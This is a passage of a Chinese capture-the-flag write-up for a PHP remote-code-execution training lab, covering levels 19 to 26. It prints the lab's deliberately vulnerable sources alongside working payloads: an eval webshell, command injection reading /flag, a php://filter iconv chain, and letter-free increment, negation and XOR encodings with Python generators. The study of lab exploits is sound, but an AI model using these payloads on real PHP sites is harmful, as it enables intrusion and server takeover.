&#125;</span><br></pre></td></tr></table></figure><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 文件写入导致的RCE --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://www.php.net/manual/zh/function.file-put-contents.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">参考可以写入的内容：</span></span><br><span class="line"><span class="comment">&lt;?php <span class="doctag">@eval</span>($_POST[&#x27;a&#x27;]); ?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloctf</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&quot;file_put_contents(&quot;</span>.<span class="variable">$code</span>.<span class="string">&quot;);&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) ? <span class="title function_ invoke__">helloctf</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考察文件写入导致的RCE，file_put_contents接受2个参数，第一个是要写入的文件，第二个是写入的内容，直接写🐎即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>或者通过闭合直接执行RCE：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="comment">//</span></span><br></pre></td></tr></table></figure><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><p>文件上传导致的RCE，就是一个简单的文件上传，传🐎即可</p><h2 id="level21"><a href="#level21" class="headerlink" title="level21"></a>level21</h2><p>简单的文件包含，可以直接包含读flag文件，也可以php-filter-chain任意代码执行</p><p>直接包含：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=&#x27;/flag&#x27;</span><br></pre></td></tr></table></figure><p>php filter chain：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&#x27;&amp;a=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><h2 id="level22"><a href="#level22" class="headerlink" title="level22"></a>level22</h2><p>php函数动态调用，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=system&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h2 id="level23"><a href="#level23" class="headerlink" title="level23"></a>level23</h2><p>无字母数字RCE，自增绕过</p><p>知识点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[].&#x27;&#x27;  //Array</span><br><span class="line">(0/0).&#x27;&#x27;   //NAN</span><br><span class="line">(1/0).&#x27;&#x27;   //INF</span><br></pre></td></tr></table></figure><blockquote><p><code>NAN</code>表示的是未被定义的值，所以我们这里可以通过<code>a/a</code>这种方式构造，如果字母也被ban，我们也可以借助其他字符，比如<code>_/_</code>，这个时候也可以得到<code>NAN</code>，同理，<code>INF</code>也可以通过<code>1/a</code>的方式获取。</p></blockquote><p>原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot;++ ==&gt; &quot;B&quot;</span><br><span class="line">&quot;B&quot;++ ==&gt; &quot;C&quot;</span><br><span class="line">$_++对变量进行了自增操作,由于我们没有定义的值,PHP会给赋一个默认值NULL==0,由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字,可利用这得到初始值A，从而通过自增得到任意字符 </span><br><span class="line">在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为&quot;Array&quot;。再取这个字符串的第一个字母，就可以获得&quot;A&quot;。而空与$不同就得到0，即A</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//B</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//D</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//GET</span></span><br><span class="line"><span class="comment">//var_dump($_);</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]));</span><br><span class="line"><span class="comment">//$_GET[_]($_GET[__])</span></span><br></pre></td></tr></table></figure><p>url编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D.<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%24&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>___.%<span class="number">24</span>__.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B__%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><h2 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h2><p>无参RCE，直接利用chdir()&amp;array_rand()读文件：</p><ul><li><p><strong>array_flip()</strong></p><p>array_flip() :交换数组中的键和值，成功时返回交换后的数组</p></li><li><p><strong>array_rand()</strong></p><p>array_rand() :从数组中随机取出一个或多个单元</p></li><li><p><strong>getcwd()</strong></p><p>getcwd():取得当前工作目录的路径</p></li><li><p><strong>scandir()</strong></p><p>scandir():将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(getcwd()))));</span><br></pre></td></tr></table></figure><p>由于每次返回的文件内容是随机的，所以需要多读几次</p><h2 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h2><p>无字母数字RCE取反绕过：<a href="https://probiusofficial.github.io/PHP-inversion/">https://probiusofficial.github.io/PHP-inversion/</a></p><p>原理：对<code>cat flag</code>等命令取反，再取反，仍然得到<code>cat flag</code>，但是可以利用它进行一些对数字字母过滤的绕过</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;[~&quot;</span> + <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;%<span class="subst">&#123;<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(c))[<span class="number">2</span>:].upper()&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s) + <span class="string">&quot;][!%FF](&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&quot;&quot;</span>).rstrip(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span>.join(one(each) <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>])</span><br><span class="line">    s += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=[~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>][!%FF]([~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>][!%FF]);</span><br><span class="line"><span class="comment">//system(&#x27;cat /flag&#x27;)</span></span><br></pre></td></tr></table></figure><h2 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : PHP 特性 - 无字母数字的代码执行 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">参考和依据的文章：https://xz.aliyun.com/t/8107</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]) ? <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>] : <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9]/is&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your Payload&#x27;s Length : &quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>无字母数字RCE，自增、取反、异或或者临时文件上传都可以，这里我们用异或</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">a = []</span><br><span class="line">ans1 = <span class="string">&quot;&quot;</span></span><br><span class="line">ans2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):  <span class="comment"># 设置i的范围</span></span><br><span class="line">    c = <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="comment"># 将i转换成ascii对应的字符，并赋值给c</span></span><br><span class="line">    tmp = re.<span class="keyword">match</span>(<span class="string">r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span>, c, re.I)</span><br><span class="line">    <span class="comment"># 设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符</span></span><br><span class="line">    <span class="keyword">if</span> (tmp):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a.append(i)</span><br><span class="line">        <span class="comment"># 在数组中增加i，这些就是未被系统过滤掉的字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eval(&quot;echo($c);&quot;);</span></span><br><span class="line">mya = <span class="string">&quot;system&quot;</span>  <span class="comment"># 函数名 这里修改！</span></span><br><span class="line">myb = <span class="string">&quot;ls&quot;</span>  <span class="comment"># 参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfun</span>(<span class="params">k, my</span>):  <span class="comment"># 自定义函数</span></span><br><span class="line">    <span class="keyword">global</span> ans1  <span class="comment"># 引用全局变量ans1，使得在局部对其进行更改时不会报错</span></span><br><span class="line">    <span class="keyword">global</span> ans2  <span class="comment"># 引用全局变量ans2，使得在局部对其进行更改时不会报错</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a)):  <span class="comment"># 设置循环范围为（0，a）注：a为未被过滤的字符数量</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(a)):  <span class="comment"># 在上个循环的条件下设置j的范围</span></span><br><span class="line">            <span class="keyword">if</span> (a[i] ^ a[j] == <span class="built_in">ord</span>(my[k])):</span><br><span class="line">                ans1 += <span class="built_in">chr</span>(a[i])  <span class="comment"># ans1=ans1+chr(a[i])</span></span><br><span class="line">                ans2 += <span class="built_in">chr</span>(a[j])  <span class="comment"># ans2=ans2+chr(a[j])</span></span><br><span class="line">                <span class="keyword">return</span>;  <span class="comment"># 返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mya)):  <span class="comment"># 设置k的范围</span></span><br><span class="line">    myfun(x, mya)  <span class="comment"># 引用自定义的函数</span></span><br><span class="line">data1 = <span class="string">&quot;(&#x27;&quot;</span> + urllib.request.quote(ans1) + <span class="string">&quot;&#x27;^&#x27;&quot;</span> + urllib.request.quote(</span><br><span class="line">    ans2) + <span class="string">&quot;&#x27;)&quot;</span>  <span class="comment"># data1等于传入的命令,&quot;+ans1+&quot;是固定格式，这样可以得到变量对应的值，再用&#x27;包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值</span></span><br><span class="line"><span class="built_in">print</span>(data1)</span><br><span class="line">ans1 = <span class="string">&quot;&quot;</span>  <span 